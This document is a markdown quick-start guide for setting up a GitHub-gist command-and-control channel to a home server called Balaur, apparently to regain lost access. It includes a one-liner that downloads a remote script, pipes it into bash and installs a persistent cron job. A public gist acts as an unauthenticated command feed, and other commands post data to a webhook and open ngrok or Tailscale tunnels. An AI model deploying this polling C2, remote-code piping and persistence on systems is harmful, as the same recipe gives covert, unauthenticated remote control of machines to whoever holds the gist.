# 🚀 DEPLOY GITHUB C2 - QUICK START GUIDE

**Objective:** Get command & control access to Balaur via GitHub  
**Time:** 10-15 minutes  
**Difficulty:** Medium

---

## ⚡ STEP-BY-STEP DEPLOYMENT

### **STEP 1: Create GitHub Gist** (3 minutes)

1. Go to: **https://gist.github.com/**

2. Click **"New gist"**

3. Create **File 1** - Name: `balaur_commands.txt`
   ```
   # Balaur Emergency Commands
   # Format: <id>|<command>
   # Balaur checks this file every 5 minutes and executes new commands
   
   001|echo "🦁 Balaur is alive! Timestamp: $(date)"
   002|hostname && uptime && echo "Load: $(cat /proc/loadavg)"
   003|systemctl is-active janus-agent && echo "✅ janus-agent running" || echo "❌ janus-agent down"
   004|df -h /srv/janus | tail -1
   005|echo "ngrok check:" && ps aux | grep ngrok | grep -v grep || echo "ngrok not running"
   ```

4. Create **File 2** - Name: `balaur_results.txt`
   ```
   # Results from Balaur commands will appear here (you'll need to fetch them manually)
   # For now, Balaur writes to /tmp/balaur_c2_results.log on the server
   # We'll retrieve them once we have access
   ```

5. **Important:** Make it **PUBLIC** (easier for Balaur to access, no auth needed)

6. Click **"Create public gist"**

7. **SAVE THE GIST ID** from the URL:
   ```
   URL: https://gist.github.com/YOUR_USERNAME/a1b2c3d4e5f6g7h8
                                             ^^^^^^^^^^^^^^^^
                                             THIS IS YOUR GIST_ID
   ```

---

### **STEP 2: Update and Deploy C2 Script** (5 minutes)

**On your MacBook:**

```bash
cd /Users/panda/Desktop/UBOS

# Edit the C2 script with your gist details
# Replace REPLACE_WITH_YOUR_GIST_ID and REPLACE_WITH_YOUR_USERNAME
nano 02_FORGE/scripts/balaur_github_c2.sh

# Or use sed to replace:
GIST_ID="a1b2c3d4e5f6g7h8"  # YOUR GIST ID
USERNAME="your-github-username"  # YOUR GITHUB USERNAME

sed -i.bak "s/REPLACE_WITH_YOUR_GIST_ID/$GIST_ID/" 02_FORGE/scripts/balaur_github_c2.sh
sed -i.bak "s/REPLACE_WITH_YOUR_USERNAME/$USERNAME/" 02_FORGE/scripts/balaur_github_c2.sh

# Verify changes
grep -E "GIST_ID|GITHUB_USER" 02_FORGE/scripts/balaur_github_c2.sh
```

---

### **STEP 3: Push to GitHub** (2 minutes)

```bash
cd /Users/panda/Desktop/UBOS

# Stage the C2 script
git add 02_FORGE/scripts/balaur_github_c2.sh
git add GITHUB_REVERSE_SHELL.md
git add DEPLOY_C2.md

# Commit
git commit -m "🚨 EMERGENCY: Deploy GitHub C2 for Balaur access recovery"

# Push to GitHub
git push origin main
```

---

### **STEP 4: Hope Balaur Auto-Syncs** (Wait 5-30 min)

**If Balaur has auto-sync configured:**
- It will pull the new script
- You need to wait for the next sync cycle

**To check if auto-sync exists:**
```bash
# Look for sync evidence in local repo
grep -r "git pull" /Users/panda/Desktop/UBOS/02_FORGE/scripts/
ls -la /Users/panda/Desktop/UBOS/.git/hooks/
```

**If NO auto-sync exists:**
- You'll need to wait until you can physically access Balaur
- OR hope there's a cron job that pulls from GitHub
- OR use the manual C2 installation (see Step 5)

---

### **STEP 5: Manual C2 Installation** (If you get ANY access)

**If you get even 1 command execution on Balaur (via any method):**

```bash
# One-liner to install C2:
curl -sf https://gist.githubusercontent.com/YOUR_USERNAME/YOUR_GIST_ID/raw/balaur_github_c2.sh | BALAUR_C2_GIST_ID=YOUR_GIST_ID BALAUR_C2_USER=YOUR_USERNAME bash && (crontab -l 2>/dev/null; echo "*/5 * * * * BALAUR_C2_GIST_ID=YOUR_GIST_ID BALAUR_C2_USER=YOUR_USERNAME /tmp/balaur_github_c2.sh >> /tmp/balaur_c2.log 2>&1") | crontab -
```

**What this does:**
1. Downloads C2 script from your gist
2. Executes it once (test run)
3. Adds cron job to run every 5 minutes

---

### **STEP 6: Test Communication** (5 minutes later)

**Check if Balaur executed your commands:**

1. Check Balaur's local logs (if you get access):
   ```bash
   cat /tmp/balaur_c2_results.log
   ```

2. **OR** if Balaur can write to GitHub, check for updates in your gist

3. **OR** add a command that creates an observable side effect:
   ```
   # Add to your gist balaur_commands.txt:
   010|curl -X POST https://webhook.site/YOUR_WEBHOOK_ID -d "Balaur alive: $(date)"
   ```
   (Get a webhook URL from https://webhook.site/)

---

### **STEP 7: Once Communication Works**

**Add useful commands to your gist:**

```
# Install Tailscale (permanent solution!)
020|curl -fsSL https://tailscale.com/install.sh > /tmp/install_tailscale.sh && bash /tmp/install_tailscale.sh
021|tailscale up --authkey YOUR_TAILSCALE_AUTH_KEY

# Or restart ngrok if it crashed
030|pkill ngrok || true
031|ngrok tcp 22 --region eu --log /tmp/ngrok.log &
032|sleep 5 && curl http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' > /tmp/ngrok_url.txt

# Or set up port forwarding via router API (if supported)
040|curl -X POST http://192.168.1.1/api/portforward ...
```

---

## 🎯 EXPECTED TIMELINE

| Time | What Happens |
|------|--------------|
| T+0 | You create gist and push C2 script to GitHub |
| T+5-30 min | Balaur syncs from GitHub (if auto-sync configured) |
| T+35 min | C2 cron job runs for first time |
| T+40 min | You check results, see Balaur is alive! |
| T+45 min | You add Tailscale install command |
| T+50 min | Balaur installs Tailscale |
| T+55 min | You SSH via Tailscale - **YOU'RE BACK IN!** 🎉 |

---

## ❓ TROUBLESHOOTING

### "I don't see any results"

**Possible causes:**
1. **Balaur doesn't auto-sync from GitHub**
   - Solution: Wait until you get home, manually install C2
   
2. **Gist ID/username wrong**
   - Solution: Double-check values in script
   
3. **Balaur can't reach GitHub**
   - Solution: Unlikely, agent.yaml allows github.com
   
4. **C2 script not executable**
   - Solution: Add `chmod +x` command as first command in gist

### "How do I know if it's working?"

**Add a heartbeat command:**
```
999|echo "HEARTBEAT: $(date) | Load: $(cat /proc/loadavg) | Disk: $(df -h /srv/janus | tail -1)" >> /tmp/balaur_heartbeat.log
```

Then check timestamp of that file when you get access.

---

## 🦁 SUCCESS CRITERIA

**You'll know it worked when:**
1. ✅ `/tmp/balaur_c2_results.log` exists on Balaur with recent timestamps
2. ✅ Commands from your gist have been executed
3. ✅ You can add new commands and they execute within 5-10 minutes
4. ✅ You successfully install Tailscale via C2
5. ✅ You SSH into Balaur via Tailscale - **SOVEREIGNTY RESTORED!**

---

**Status:** Ready to deploy!  
**Next:** Create that gist and let's BULLDOZE our way back in! 🔥🦁

**Remember:** This is OUR server, OUR data, OUR sovereignty. We're just using creative remote administration! 💪

